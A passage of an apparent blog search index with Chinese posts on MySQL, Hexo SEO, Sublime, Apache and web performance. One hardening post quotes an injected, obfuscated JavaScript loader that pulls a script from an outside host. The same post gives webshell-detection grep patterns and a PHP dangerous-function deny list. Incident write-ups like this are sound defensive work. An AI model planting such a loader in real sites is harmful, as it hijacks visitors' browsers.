型触发器中，OLD 用来表示将要或已经被修改的原数据，NEW 用来表示将要或已经修改为的新数据；在 DELETE 型触发器中，OLD 用来表示将要或已经被删除的原数据；使用方法： NEW.columnName （columnName 为相应数据表某一列名）另外，OLD 是只读的，而 NEW 则可以在触发器中使用 SET 赋值，这样不会再次触发触发器，造成循环调用（如每插入一个学生前，都在其学号前加“2013”）。 查看触发器和查看数据库（show databases;）查看表格（show tables;）一样，查看触发器的语法如下： 1SHOW TRIGGERS [FROM schema_name]; 其中，schema_name 即 Schema 的名称，在 MySQL 中 Schema 和 Database 是一样的，也就是说，可以指定数据库名，这样就 不必先“USE database_name;”了。 删除触发器和删除数据库、删除表格一样，删除触发器的语法如下： 1DROP TRIGGER [IF EXISTS] [schema_name.]trigger_name 触发器的执行顺序我们建立的数据库一般都是 InnoDB 数据库，其上建立的表是事务性表，也就是事务安全的。这时，若SQL语句或触发器执行失败，MySQL 会回滚事务，有： ①如果 BEFORE 触发器执行失败，SQL 无法正确执行。②SQL 执行失败时，AFTER 型触发器不会触发。③AFTER 类型的触发器执行失败，SQL 会回滚。]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Storage</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo 站点 SEO 优化]]></title>
    <url>%2Fexperience%2Fpractice%2Ffrontend-stie-optimize%2F</url>
    <content type="text"><![CDATA[robots.txt12345678910111213User-agent: *Allow: /Allow: /home/Allow: /archives/Allow: /about/Disallow: /vendors/Disallow: /js/Disallow: /css/Disallow: /fonts/Disallow: /vendors/Disallow: /fancybox/Sitemap: http://0x400.com/sitemap.xmlSitemap: http://0x400.com/baidusitemap.xml 站点地图首先安装sitemap和百度版本的sitemap 12npm install hexo-generator-sitemap --savenpm install hexo-generator-baidu-sitemap --save 打开配置文件_config.yml添加 12345# Sitemapsitemap: path: sitemap.xmlbaidusitemap: path: baidusitemap.xml hexo g 以后会在站点 public 目录下生成 baidusitemap.xml和 stiemap.xml，如图： 修改文章链接HEXO默认的文章链接形式为domain/year/month/day/postname，默认就是一个四级url，并且可能造成url过长，对搜索引擎是十分不友好的，我们可以改成domain/postname 的形式。编辑站点_config.yml文件，修改其中的permalink字段改为permalink: :title.html即可。 首页title的优化更改index.swig文件，文件路径是your-hexo-site\themes\next\layout，将下面代码 1&#123;% block title %&#125; &#123;&#123; config.title &#125;&#125; &#123;% endblock %&#125; 改成 1&#123;% block title %&#125; &#123;&#123; config.title &#125;&#125; - &#123;&#123; theme.description &#125;&#125; &#123;% endblock %&#125; keywords 和 description在\scaffolds\post.md中添加如下代码，用于生成的文章中添加关键字和描述。 12keywords:description: 参考 http://hunao.info/2016/06/01/Hexo-Seo%E4%BC%98%E5%8C%96%E8%AE%A9%E4%BD%A0%E7%9A%84%E5%8D%9A%E5%AE%A2%E5%9C%A8google%E6%90%9C%E7%B4%A2%E6%8E%92%E5%90%8D%E7%AC%AC%E4%B8%80/]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>SEO</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP 内置函数的一些注意事项]]></title>
    <url>%2Ffundamental%2Fprogramming-language%2Fphp%2Fphp-internal-function-note%2F</url>
    <content type="text"><![CDATA[PHP 常用函数使用笔记 count($arr) 和 strlen($str) 的时间复杂度都是 O(1)，这是因为 PHP 所有变量都是用 Hash 结构存储，在内部维护了 Array 的元素个数和字符串的长度。 is_int() 和is_integer是等价的。 in_array() 可以使用第二个参数忽略大小写。 【JavaScript】slice() 的坑：如果该元素是个对象引用 （不是实际的对象），slice 会拷贝这个对象引用到新的数组里。两个对象引用都引用了同一个对象。如果被引用的对象发生改变，则新的和原来的数组中的这个元素也会发生改变。 json_encode() json_encode((object)null) == {} &amp;&amp; json_encode([]) == [] 参考资料]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Programing-language</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Build Node.js developed environment on Windows 7]]></title>
    <url>%2Fexperience%2Fguide%2Fdev-sublime-text-3-build-node%2F</url>
    <content type="text"><![CDATA[installation windows-nvmDownload windows-nvm from https://github.com/coreybutler/nvm-windows/releases and install it. Usage: nvm version : show version nvm list : show available node version nvm uninstall: uninstall a specific node version nvm use: use a specific node version … see here installation nodeinstall stable: nvm install latest then show available node versions: nvm list select a specific version from available list : use xx npm using taobao registry temporary using 1npm --registry https://registry.npm.taobao.org install express permanent using 1npm config set registry https://registry.npm.taobao.org or using cnpm instead of npm123npm install -g cnpm --registry=https://registry.npm.taobao.orgcnpm install express testing:123npm config get registry# ornpm info express configuration build key map in Sublime-text 3Open Sublime Text 3, then ctr+shift+p input pci call out Package control install package window and search Node.js package](https://github.com/tanepiper/SublimeText-Nodejs) Enjoy it!]]></content>
      <categories>
        <category>Experience</category>
        <category>Guide</category>
      </categories>
      <tags>
        <tag>Node</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL 索引相关 SQL]]></title>
    <url>%2Ffundamental%2Fstorage%2Fmysql-sql-about-index%2F</url>
    <content type="text"><![CDATA[创建索引1．ALTER TABLEALTER TABLE用来创建普通索引、UNIQUE索引或PRIMARY KEY索引。 123456ALTER TABLE table_name ADD INDEX IDX_ABC (a,b,c) USEING BTREEALTER TABLE table_name ADD UNIQUE (column_list)ALTER TABLE table_name ADD PRIMARY KEY (column_list) 其中 table_name 是要增加索引的表名，column_list指出对哪些列进行索引，多列时各列之间用逗号分隔。索引名index_name可选，缺省时，MySQL 将根据第一个索引列赋一个名称。另外，ALTER TABLE 允许在单个语句中更改多个表，因此可以在同时创建多个索引。USEING BTREE 表示索引使用的数据结构为 B 树。 2．CREATE INDEXCREATE INDEX 可对表增加普通索引或 UNIQUE 索引。 123CREATE INDEX index_name ON table_name (column_list)CREATE UNIQUE INDEX index_name ON table_name (column_list) table_name、index_name 和column_list 具有与ALTER TABLE语句中相同的含义，索引名不可选。另外，不能用CREATE INDEX语句创建PRIMARY KEY索引。 查看索引123mysql&gt; SHOW INDEX FROM tblname;mysql&gt; SHOW KEYS FROM tblname; Name Description Table 表的名称 Non_unique 如果索引不能包括重复词，则为0。如果可以，则为1。 Key_name 索引的名称 Seq_in_index 索引中的列序列号，从1开始。 Column_name 建索引的列名称 Collation 列以什么方式存储在索引中。在 MySQL 中，有值 A 升序）或 NULL（无分类）。 Cardinality 索引中唯一值的数目的估计值。通过运行ANALYZE TABLE或 myisamchk -a 可以更新。基数根据被存储为整数的统计数据来计数，所以即使对于小型表，该值也没有必要是精确的。基数越大，当进行联合时，MySQL使用该索引的机会就越大。 Sub_part 如果列只是被部分地编入索引，则为被编入索引的字符的数目。如果整列被编入索引，则为NULL Packed 指示关键字如何被压缩。如果没有被压缩，则为NULL。 Null 如果列含有NULL，则含有YES。如果没有，则该列含有NO。 Index_type 过的索引方法（BTREE, FULLTEXT, HASH, RTREE） Comment 注释 删除索引可利用 ALTER TABLE 或 DROP INDEX 语句来删除索引。类似于 CREATE INDEX 语句，DROP INDEX可以在ALTER TABLE内部作为一条语句处理，语法如下。 12345DROP INDEX index_name ON talbe_nameALTER TABLE table_name DROP INDEX index_nameALTER TABLE table_name DROP PRIMARY KEY 其中，前两条语句是等价的，删除掉table_name中的索引index_name。 第3条语句只在删除PRIMARY KEY索引时使用，因为一个表只可能有一个PRIMARY KEY索引，因此不需要指定索引名。如果没有创建PRIMARY KEY索引，但表具有一个或多个UNIQUE索引，则MySQL将删除第一个UNIQUE索引。如果从表中删除了某列，则索引会受到影响。对于多列组合的索引，如果删除其中的某列，则该列也会从索引中删除。如果删除组成索引的所有列，则整个索引将被删除。 参考资料 https://stackoverflow.com/questions/10259504/delimiters-in-mysql https://stackoverflow.com/questions/4205181/insert-into-a-mysql-table-or-update-if-exists]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Storage</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sublime Text 3 配置]]></title>
    <url>%2Fexperience%2Fguide%2Fdev-sublime-text-3-preference%2F</url>
    <content type="text"><![CDATA[本文记录了 Sublime Text 3 的配置教程，包括一些个人常用插件的安装和使用。 环境和依赖环境： Deeepin 15.4 依赖： Python 2.7 安装 Sublime Text 3，Sublime Text 官网注册码，https://fatesinger.com/100121 Please support authorized software if you can. 安装包管理器ctr+` 打开控制台，输入代码 12345678import urllib.request,os,hashlib; h = &apos;2915d1851351e5ee549c20394736b442&apos; +&apos;8bc59f460fa1548d1514676163dafc88&apos;; pf = &apos;Package Control.sublime-package&apos;;ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by =urllib.request.urlopen( &apos;http://packagecontrol.io/&apos; + pf.replace(&apos; &apos;, &apos;%20&apos;)).read(); dh = hashlib.sha256(by).hexdigest(); print(&apos;Error validatingdownload (got %s instead of %s), please try manual install&apos; % (dh, h)) ifdh != h else open(os.path.join( ipp, pf), &apos;wb&apos; ).write(by) 有一次，遇到以下报错：123456789101112131415161718192021222324Traceback (most recent call last): File &quot;./python3.3/urllib/request.py&quot;, line 1248, in do_open File &quot;./python3.3/http/client.py&quot;, line 1065, in request File &quot;./python3.3/http/client.py&quot;, line 1103, in _send_request File &quot;./python3.3/http/client.py&quot;, line 1061, in endheaders File &quot;./python3.3/http/client.py&quot;, line 906, in _send_output File &quot;./python3.3/http/client.py&quot;, line 844, in send File &quot;./python3.3/http/client.py&quot;, line 822, in connect File &quot;./python3.3/socket.py&quot;, line 435, in create_connection File &quot;./python3.3/socket.py&quot;, line 426, in create_connectionTimeoutError: [WinError 10060] 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。During handling of the above exception, another exception occurred:Traceback (most recent call last): File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt; File &quot;./python3.3/urllib/request.py&quot;, line 156, in urlopen File &quot;./python3.3/urllib/request.py&quot;, line 469, in open File &quot;./python3.3/urllib/request.py&quot;, line 487, in _open File &quot;./python3.3/urllib/request.py&quot;, line 447, in _call_chain File &quot;./python3.3/urllib/request.py&quot;, line 1274, in http_open File &quot;./python3.3/urllib/request.py&quot;, line 1251, in do_openurllib.error.URLError: &lt;urlopen error [WinError 10060]由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。&gt; 尝试了以下解决措施： 安装python3，没解决，估计是网络问题 手动安装 点击 Preferences &gt; Browse Packages… 进入 Installed Packages/ 目录 下载 Package Control.sublime-package，并复制文件到 Installed Packages/ 目录 重启 Sublime Text 再次安装失败再次手动安装 github下载https://github.com/wbond/sublime_package_control 解压后把文件夹名称改为Package Control 点击 Preferences &gt; Browse Packages… 将Package Control 复制到该文件夹中，重启sublime ctr + shift + p打开的窗口中输入pci 弹出窗口如下说明成功 Material Theme 主题 ctr+shift+p 输入pci Package Control: Install Package and press enter. Then search for Material Theme Activate the theme :ctr+shift+p 输入 Material Theme选择 常用插件 Sub­lime­CodeIn­tel提供代码提示，函数、对象或变量名称等。还可以提示对象或类中哪些方法和变量。基于komodo codeintel开发，虽然有时会有一些问题，但是大多时候是没问题的。 Sub­limeLin­ter代码提错工具。但是从sublime 3开始，SublimeLineter编程模块化，所以安装完主安装包之后，还需要安装你需要支持的对应的语言的插件。对于PHP+js的开发，可以安装如下插件：SublimeLinter-phpSublimeLinter-jshintSublimeLinter-jsonand SublimeLinter-csslint VCS Gut­ter 编码的时候避免不了使用Git或SVN，VCS Gutter可以很方便的在代码中显示代码改动，支持Git、 Mercurial和 Subversion Origami: 神器！可以任意的操纵sublime的屏幕，比如左右分屏，上下分屏，先上下再左右，先左右再上下。 Markdown 写作环境，OmniMarkupPriviewerOmniMarkupPreviewer Markdown 实时预览插件，安装使用详见官网，安装过程中如果出现 404 问题， 请参照 issue Emmet AutoFileName Sublime-gbk TrailingSpaces 高亮多余空格，设置 Sublime 中的 trim_trialing_white_space_on_save为 true 可对多余空格自动删除。]]></content>
      <categories>
        <category>Experience</category>
        <category>Guide</category>
      </categories>
      <tags>
        <tag>Sublime</tag>
        <tag>插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[零散 bug 记录]]></title>
    <url>%2Fexperience%2Fdebugging%2Flinux-debug%2F</url>
    <content type="text"><![CDATA[本文记录日常工作、学习、生活中遇到的 BUG！ Linux 相关 deepin 搜狗输入法顿号输入 BUG，解决详见：https://bbs.deepin.org/forum.php?mod=viewthread&amp;tid=36369 git push 到 GitHub 警告 1Warning: Permanently added the RSA host key for IP address 解决详见：https://stackoverflow.com/questions/18711794/warning-permanently-added-the-rsa-host-key-for-ip-address deepin 下 Lantern 启动错误 1234Running installation script.../usr/lib/lantern/lantern-binary: 成功/home/gbin/.lantern/bin/lantern: error while loading shared libraries: libappindicator3.so.1:open shared object file: No such file or directory Install the libappindicator3,see issue step 1 12$ apt-cache search libappindicator3 gir1.2-appindicator3-0.1 - Typelib figir1.2-appindicator3-0.1 - Typelib files for libappindicator3-1 step 2 1$ sudo apt-get install -y libappindicator3-1 done! Nginx 报错： 1Nginx: nginx: [warn] load balancing method redefined You can mix keepalive and least_conn, but you should define least_conn before keepalive https://ma.ttias.be/nginx-nginx-warn-load-balancing-method-redefined/ MySQL 相关 column xx in field list is ambiguous，一般在 join 的时候出现字段模糊，字段前添加表名即可。 如下报错： 12345SELECT product_id, presentationFROM VariantINNER JOIN productCategory ON product_id = product_idLIMIT 10; 改为： 1234567SELECT Variant.product_id, presentationFROM Variant INNER JOIN productCategory ON productCategory.product_id = Variant.product_id LIMIT 10; ​ ​]]></content>
      <categories>
        <category>Experience</category>
        <category>Debugging</category>
      </categories>
      <tags>
        <tag>BUG</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用 SSH public key 免密码登录]]></title>
    <url>%2Fexperience%2Fguide%2Flinux-configure-ssh-no-password-to-login%2F</url>
    <content type="text"><![CDATA[本文记录客户端 C 无密码连接服务器 S 的配置过程。 step 1客户端 C 生成一对秘钥：1ssh-keygen -t rsa 随后三个回车12ls ~/.ssh/id_rsa id_rsa.pub known_hosts 秘钥生成成功！ step 2将客户端 C 生成的秘钥上传到服务端 S，在客户端执行： 1scp ~/.ssh/id_rsa.pub username@host:~/.ssh/ step 3登录服务器，在服务端 S 中执行：1cat ~/.ssh/id_rsa.pub &gt;&gt; authrized_keys done! 注意：.ssh 和 .ssh/id_rsa.pub 的权限分别是 700 和 600 应用案例： git push 到 GitHub Linux A 连接 Linux B]]></content>
      <categories>
        <category>Experience</category>
        <category>Guide</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[京东 PHP 一面、二面总结]]></title>
    <url>%2Fepisode%2Fjd-php-interview%2F</url>
    <content type="text"><![CDATA[一面2017 年 9 月 23 日上午 11:00 左右，小雨，在上海瀚海明玉大酒店，面试官是个女的，面试过程大概经历了 40 多分钟，其中大部分时间都由我在讲，全程问题都是围绕我的自我介绍和项目经验展开，我很主动。 自我介绍 毕业，我虽非计算机相关专业，但我较为系统的学习过计算机相关知识 …… （以时间为线索） 2014 年 …… 2015 年 …… 2016 年 …… 2017 年 …… 项目介绍 自我介绍中有讲在腾讯大连实习，参与了 PC QQ 看点和 TIM 消息漫游等项目的开发，因此对项目做了简单的介绍 …… 安全处理 因为自我介绍中提到了 WEB 安全升级，问了我做了哪些安全防范，从前端到后端都答了，因为之前有总结过，具体可以看我之前的博文 WEB 性能优化 项目中提到了性能优化，然后问我做了哪些优化，这些问题都是比较广，比较开放，还好之前总结过，按照总结的思路逐一说，从前端到后端都有做优化，从如何减少 HTTP 请求(webpack js/css打包) –&gt; 减少 TCP 连接(keep-alive) –&gt; 压缩(gzip/deflate) –&gt; 缓存等，大到传输、计算、存储，小到 HTTP 各种版本之间的区别，我会的都说了，面试官一直在耐心的听，偶尔打断一下我，偶尔补充一下。最后一句是对 MySQL 做优化，所以面试官又问下一个问题了…… 数据库优化 面试官问了我对 MySQL 做了哪些优化，因为这些问题我都已经写好答案了，所以直接按照 这个答就行，从建表建库到引擎选择，索引选择，到 SQL 优化到分表分库，读写分离、主从复制等。从原理到实现，反正我会的都讲了，一直滔滔不绝，看得出面试官很满意 …… 数组去重复 数组去重实际上是因为我项目中遇到了，从面经中也看到京东会问数组去重，所以就故意说项目中的业务有去重，所以自然就问我怎么去重复了，当然我的答案是结合项目回答的。待我详细说说 QQ 看点的项目中，QQ 客户端 —–&gt; 中间件 ——-&gt; QQ 后台。从客户端到后台拉取新闻时，需要由中间件对数据处理，其中业务之一就是如果返回的文章中已经在前端页面中展示了，那么该文章属于重复，应该去重。去重的常规方式一般有 PHP 系统函数 array_unique() 或 array_flip() 键值反转函数，然而查阅 PHP 源码不难发现，array_unique 是使用 zend_qsort （zend 引擎的快速排序） 先排序再实现的，平均复杂度是 O(nlogn)， 而 array_flip 是 hash 结构的键值反转，因此需要遍历数组，复杂度为 O(n)。我的项目中自然就使用 hash 结构去重，如果单纯判断一篇文章是否重复的话仅需要 O(1) 的复杂度。 跨域问题 跨域问题也是我总结好的，常用两种跨域方式 CORS 和 JSONP ，CORS 之前有详细总结过，而 JSONP 跨域的原理按照 jQuery.js 源码实现方式说，就是动态创建 script 结点，使用 script 标签中 src 属性不受浏览器同源策略影响的特点实现跨域， 面试官显然也满意。 以上几个问题以后，时间就过了 40 多分钟了，期间我有两次强调自己虽然是非计算机相关专业，但从大一开始就系统的学习计算机相关知识，为了不让面试官鄙视为半路出家、强行转行等。最后面试官也两次和我强调，她说不用担心自己是非计算机相关专业，她们更看重实力，然后问我有什么问题，我说我从外地来，如果有二面的话希望早一点，她说：“好的，我给你标注一下，安排你早一点面试”。 一面完。 二面（项目经验） 自我介绍 讲其中一个项目经验 项目的架构图 跨域 jsonp 跨域 cors 跨域：简单请求和非简单请求，如果设置请求头信息以实现跨域请求 讲了数组去重复， Hash 冲突解决方案 array_unique() 函数和 array_flip() 函数，HashTable 数组去重 拉链法、链接法解决 Hash 冲突 问了另一个项目 问了为什么用 Node.js 为什么用 MongoDB 事件驱动，异步 IO 、非阻塞 key-value 存储，文档存储 问了 Promise 回掉处理： callback –&gt; genarator –&gt; promise –&gt; async 函数（ES 7） 项目中 Token 延时机制 像 SESSION 一样缓存，设置缓存过期时间 项目中文件状态锁 MongoDB 实现事务而已 问了如何获取来访 IP $_SERVER[&#39;REMOTE_ADDR&#39;] || $_SERVER[&#39;HTTP_CLIENT_IP&#39;] || $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]&lt;==&gt; Apache || IIS || 代理服务器 二面完。]]></content>
      <categories>
        <category>Episode</category>
      </categories>
      <tags>
        <tag>缓存</tag>
        <tag>优化</tag>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WEB 安全实战]]></title>
    <url>%2Fexperience%2Fpractice%2Flinux-web-security%2F</url>
    <content type="text"><![CDATA[这几天网站被黑客盯上了，因为安全做得不好，被黑客攻击了好几次。常见的 WEB 攻击包括 XSS 攻击、SQL 注入、DDOS、CRFS 等，为了提高网站安全性能，最近特意对网站做了安全维护，属予作文以记之。 攻击记录 有一次黑客在首页引入的 jQuery-1.8.0.js 中写入一行 js 代码, 1234var str=&quot;cnbtldms-vqhsd &apos;!;rbqhos rqb&lt;[!gsso9..vvv- fnnfkd`crk-bnl.robncd.iptdqx-ir[!=;.rbqhos=!(:&quot;;var length=str.length;var ba64=&quot;&quot;;for(i=0;i&lt;length;i++)&#123;vars=str.charCodeAt(i);s++;ba64=ba64+String.fromCharCode(s)&#125;eval(ba64); 翻译后是 1document.write (&quot;\&lt;script src=&quot;http://www.googleadsl.com/spcode/jquery.js&quot;&gt;&lt;/script&gt;&quot;) 导致的结果是打开网站几秒后跳转到一个色情页面，页面太美，不忍直视。 还有一次是文件内容被篡改。被攻击那天早上打开一个页面的时候突然发现服务器 500 异常，然后登陆服务器查看站点目录， stat filename 发现站点下有一个目录下的所有文件均在该日凌晨 5:16 分左右被修改。打开内容一看，画面惨不忍睹。 在有一次就是黑客上传文件到特定目录下 木马查杀 快速木马查找命令 123grep -r --include=*.php &apos;[^a-z]eval($_POST&apos; /var/www/html/grep -r --include=*.php &apos;[^a-z]eval($_&apos; /var/wwwgrep -r --include=*.php &apos;file_put_contents(.*$_POST\[.*\]);&apos; /var/www/html/ 利用find mtime查找最近两天或者发现木马的这几天，有哪些PHP文件被修改 1find -mtime -2 -type f -name \*.php PHP 安全防范 确保运行 PHP 的用户为一般用户，如 www 禁用 PHP 危险函数 12345678disable_functions = passthru,exec,system,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,phpinfo #禁用的函数expose_php = off #避信免暴露PHP息display_errors = offenable_dl = offallow_url_include = offsession.cookie_httponly = 1upload_tmp_dir = /tmp 改变 PHP 文件的权限：644 123chmod 644 -R ./find ./ -type d -print|xargs chmod 755;chown -R apache:apache ./ 关闭上传目录的 PHP 执行权限 123456789&lt;Directory &quot;/home/www/upload/&quot;&gt; php_flag engine off # 关闭 PHP 执行引擎 &lt;filesmatch &quot;(.*)php&quot;&gt; # 匹配以 PHP 结尾的文件，设置权限 Order deny,allow Deny from all # 全部不解析 Allow from localhost # 允许例外： Allow from 127.0.0.1 # 允许的例外 &lt;/filesmatch&gt;&lt;/Directory&gt; Apache 安全 更改 Apache 的用户为一般用户，如 apache，注意存放数据目录权限为 apache 12User apacheGroup apache 禁用 -Indexes 1Options -Indexes FollowSymLinks 如果目录下没有 index.* 文件则 403 错误而不是列出目录下的文件。 启用 mod_security 模块防止 SQL 注入 安装： 1yum install mod_security httpd.conf 中引入 mod_security.conf 设置 HTTP 头信息防止 XSS 攻击 123&lt;IfModule mod_headers.c&gt;Header set X-XSS-Protection &quot;1; mode=block&quot;&lt;/IfModule&gt; mod_evasive20 防止 DDOS 攻击 参考 https://blog.linuxeye.cn/351.html https://www.howtoforge.com/apache_mod_security https://serverfault.com/questions/604746/mod-security-another-rule-with-same-id]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Apache 配置文件简述]]></title>
    <url>%2Fexperience%2Fpractice%2Flinux-apache-config%2F</url>
    <content type="text"><![CDATA[本文简书 Apache 配置文件。 常用命令123456789# 查看哪种 MPMhttpd -l || apachectl -l# 查看当前的连接数可以用ps aux | grep httpd | wc -l#或pgrep httpd | wc -l# 计算httpd占用内存的平均数ps aux|grep -v grep|awk &apos;/httpd/&#123;sum+=$6;n++&#125;;END&#123;print sum/n&#125;&apos; 配置文件ServerRoot 主机工作目录Listen 监听端口LoadModule 加载动态模块执行用户，包括子进程执行用户12User daemonGroup daemon 服务器域名ServerName www.gbin.me 文档目录，网站根目录，也即是域名对应的站点目录DocumentRoot /home/www www.gbin.me &lt;===&gt; /home/www 目录权限控制1234567&lt;Directory &quot;/www&quot;&gt; Options Indexes FollowSymLinks AllowOverride All Order allow,deny Allow from all Require all granted&lt;/Directory&gt; - Options是对该目录的一些选项, Indexes表示在没有index.html等文件的时候显示文件列表 - AllowOverride All 表示允许使用 .htaccess 文件重写 URL，None 禁止用户覆盖(重载)配置文件 apache 的安全模块 mod_evasive20( 防DDOS攻击) mod_limittipconn(针对单站点)配置 mod_security(防止SQL注入) 设置目录默认首页1DirectoryIndex index.html index.php #优先级从左往右依次降低 错误日志1ErrorLog &quot;logs/error_log&quot; 访问日志1CustomLog &quot;logs/access_log&quot; common 解析 .php 的脚本1AddType application/x-httpd-php .php 控制错误页面的输出1ErrorDocument 404 /missing.html 包含外部配置文件1Include etc//extra/httpd-vhosts.conf 虚拟目录1Alias /var/gbin/ &quot;home/www/gbin&quot; # 虚拟目录（目录别名） /var/gbin/ ==&gt; /home/www/gbin ServerSignature offapache目录文件权限设置(www:www 目录755 文件644)mpm 三种模式 preworkApache2.2版本prefork参数： 123456789&lt;IfModule prefork.c&gt; StartServers 8 #默认启动的工作进程数；启动时开启的进程数 MinSpareServers 5 #最少空闲进程数，保存备用；备用进程的最小数目 MaxSpareServers 20 #最大空闲进程数，保存备用；备用进程的最大数目 ServerLimit 256 #最大活动进程数 MaxClients 256 #并发请求的最大数 MaxRequestsPerChild 4000 #每个子进程在生命周期内所能够服务的最多请求个数； #合理配置此参数可以有效避免apache服务器内存溢出&lt;/IfModule&gt; 注意：虽然MaxRequestsPerChild缺省设为0可以使每个子进程处理更多的请求，但如果设成非零 值也有两点重要的好处： 1、可防止意外的内存泄漏。 2、在服务器负载下降的时侯会自动减少子进程数。因此，可根据服务器的负载来调整这个值。Apache2.4版本prefork参数： 1234567&lt;IfModule mpm_prefork_module&gt; #如果mpm_prefork_module这个模块被启用 StartServers 5 #启动时开启的进程数 MinSpareServers 5 #最少空闲进程数，保存备用；备用进程的最小数目 MaxSpareServers 10 #最大空闲进程数，保存备用；备用进程的最大数目 MaxRequestWorkers 250 #并发请求的最大数 MaxConnectionsPerChild 0 #每个子进程在生命周期内所能够服务的最多请求个数；&lt;/IfModule&gt; worker event 虚拟主机压测1ab -n XXX -c YYY http://hostname.port/path/filename 并发 XXX 个请求 连接数为 YYY 参考链接 http://1005969720.blog.51cto.com/9082248/1744452 https://www.kancloud.cn/curder/apache/91278]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WEB 性能优化实战]]></title>
    <url>%2Fexperience%2Fpractice%2Ffrontend-web-performance-optimization%2F</url>
    <content type="text"><![CDATA[WEB 访问速度直接影响了用户体验，本文从以下几个方面对学校就业网做了简单优化， 减少 HTTP 请求 减少 TCP 连接 启用压缩 启用 HTTP 缓存 静态页面缓存 优化前，首页请求总数达到 110 多个，每次请求完成时间 Finished 在 8s 左右，DOM 加载 DOMContentLoaded 在 4s 左右，页面加载 Load 在 6 秒。对页面进行优化后，首次请求如下图： 二次请求如下： 性能提高近 3 倍。 减少 HTTP 请求减少 HTTP 请求可以间接减少 TCP 连接次数，减少页面加载时间。 使用打包工具 webpack 等可以将一个文件下的外引 JS、CSS 文件合并、压缩，也可以手动合并、压缩。 减少 TCP 连接HTTP 是无状态连接方式，作用于网络七层的应用层，在 HTTP 1.0 版本中，每个 HTTP 请求都会发起一个 TCP 连接，TCP 连接进行三次握手，因此每个 HTTP 请求都需要等待 TCP 连接完成才能返回数据。为了减少 TCP 连接的等待时间，实现连接复用，HTTP 1.1 版本引入 keep-alive以实现 TCP 多个 HTTP 请求共享 TCP 连接通道。 对于 Apache ，只需在配置文件 httpd.conf 中加入以下代码即可启用 keep-alive，123KeepAlive OnMaxKeepAliveRequests 300KeepAliveTimeout 10 KeepAlive在增加访问效率的同时，也会增加服务器的压力。因此要根据服务器性能合理设置 MaxKeepAliveRequests 和 KeepAliveTimeout 的值。可参考《KeepAlive，你优化了吗》 【备注】 keep-alive 是 HTTP 1.1 和 1.0 版本的一个差异，此外 1.1 版本还引入了 5 中 HTTP 请求方式，OPTIONS、PUT、DELETE、TRACE、CONNECT，1.1 之后又增加了一种 PATCH。详情 启用压缩HTTP 是超文本传输协议，如果以原始文本传输，传输速度并不是最优，为了使得文本传输数据包尽可能小，HTTP 允许使用 GZIP 等方式对文本进行压缩，请求头信息中的 Accept-Encoding 和 Content-Type控制压缩。开启 gzip 压缩以后，其体积可以减小 60%~90%，可以节省下大量的带宽与用户等待时间。 LAMP 架构中，配置 Apache 或 PHP 都可以开启 GZIP 压缩，根据情况选择其中一种方式即可， Apache 开启 GZIP打开配置文件 httpd.conf，找到以下模块，去掉前面的注释，12LoadModule deflate_module modules/mod_deflate.soLoadModule headers_module modules/mod_headers.so 添加以下代码，1234567&lt;IfModule deflate_module&gt;SetOutputFilter DEFLATESetEnvIfNoCase Request_URI .(?:gif|jpe?g|png)$ no-gzip dont-varySetEnvIfNoCase Request_URI .(?:exe|t?gz|zip|bz2|sit|rar)$ no-gzip dont-varySetEnvIfNoCase Request_URI .(?:pdf|doc|avi|mov|mp3|rm)$ no-gzip dont-varyAddOutputFilterByType DEFLATE application/x-javascript text/html text/plain text/xml text/css&lt;/IfModule&gt; PHP 开启 GZIPPHP 开启 GZIP 可以通过修改配置文件，如果只针对特定 PHP 页面开启压缩，也可以使用 ob_start 函数 修改 php.ini 打开 PHP 目录下的 php.ini 文件，找到 zlib.output_compression = off，改为 12zlib.output_compression = Onzlib.output_compression_level = -1 特定 PHP 文件开启 GZIP 12345if (substr_count($_SERVER[&apos;HTTP_ACCEPT_ENCODING&apos;], &apos;gzip&apos;)) &#123; ob_start(&apos;ob_gzhandler&apos;);&#125;else&#123; ob_start();&#125; 【备注1】 PHP GZIP 以来 zlib 模块，PHP 4.3 以后 zlib 模块内置在 PHP 中，如果没有相应模块需要编译安装。【备注2】 为了 HTTP 性能， HTTP 2.0 版本中将使用二进制传输。 启用 HTTP 缓存HTTP 缓存对性能的优化是相当重要的，HTTP 花费的时间主要在等待和下载上，启用缓存后使用 Last-Modified 或者 ETag 监测资源的变化，如果资源不发生改变且本地缓存不过期，资源将直接从本地取回，缩短了 HTTP 请求的时间。 对于 Apache 服务器，可以通过 mod_expires 模块来设定 Expires HTTP 头或 Cache-Contro lHTTP 头的 max-age 指令，打开 httpd.conf 搜索 expires_module，确保该模块已经引入， 1LoadModule expires_module modules/mod_expires.so 添加以下代码，1234567891011&lt;IfModule mod_expires.c&gt; ExpiresActive On ExpiresByType text/css &quot;access plus 1 